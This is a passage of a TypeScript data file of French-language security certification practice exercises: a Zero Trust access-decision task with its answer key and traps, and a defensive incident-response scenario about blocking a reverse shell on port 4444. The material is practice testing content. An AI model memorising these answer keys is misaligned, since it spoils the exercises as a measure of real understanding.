          "R4: Groupe Marketing | Appareil conforme | MFA: réussi | Localisation: approuvée | Risque: Low",
          "R5: Groupe Finance | Appareil conforme | MFA: ÉCHOUÉ | Localisation: approuvée | Risque: Low",
          "R6: Groupe Finance | Appareil conforme | MFA: réussi | Localisation: approuvée | Risque: HIGH",
        ],
        options: ["Allow", "Step-up authentication", "Deny"],
        expectedAnswers: [
          "Allow",
          "Deny",
          "Step-up authentication",
          "Deny",
          "Deny",
          "Deny",
        ],
        explanation: `R1 — Allow : toutes les conditions sont satisfaites (groupe OK, appareil conforme, MFA OK, lieu approuvé, risque Low).
R2 — Deny : appareil non conforme — condition éliminatoire en Zero Trust.
R3 — Step-up authentication : localisation nouvelle mais risque Medium acceptable avec vérification supplémentaire.
R4 — Deny : groupe Marketing ≠ groupe Finance — condition d'appartenance non respectée.
R5 — Deny : MFA échoué — condition éliminatoire, aucune exception.
R6 — Deny : risque HIGH dépasse le seuil Medium — refus même si toutes les autres conditions sont OK.`,
        traps: [
          "Allow car utilisateur Finance seul : Zero Trust exige TOUTES les conditions simultanément.",
          "Step-up pour risque High : le risque High est trop élevé → Deny, pas Step-up.",
          "Allow car appareil conforme + MFA OK : le groupe incorrect (R4) suffit pour Deny.",
        ],
        points: 60,
      },
    ],
  } satisfies ScenarioTasksPBQ,
  {
    id: "pbq-terminal-001",
    domain: "Security Operations",
    type: "terminal",
    title: "Incident Response: Reverse Shell",
    difficulty: "advanced",
    timeLimitSeconds: 300,
    role: "SOC Analyst",
    scenario: "Une alerte SIEM signale un trafic sortant suspect depuis un poste client. Utilisez les outils de la console pour enquêter et contenir la menace.",
    objective: "Identifier le port et le processus suspect, puis bloquer l'IP malveillante via le pare-feu.",
    terminalScenario: "reverse-shell",
    requirements: [
      "Identifier le port ouvert suspect (netstat ou nmap).",
      "Détecter la destination et l'IP suspecte (whois).",
      "Inspecter les règles de pare-feu actives (iptables).",
      "Bloquer la menace en fermant le port 4444 (iptables block 4444 ou block 4444)."
    ],
    scoring: {
      max: 100,
      rules: [
        { condition: "reconnaissance_reussie", points: 25 },
        { condition: "investigation_reussie", points: 25 },
        { condition: "inspection_reussie", points: 25 },
        { condition: "remediation_reussie", points: 25 }
      ]
    }
  } satisfies TerminalPBQ,
  ...(importedPbqExercises as PBQExercise[]),
];
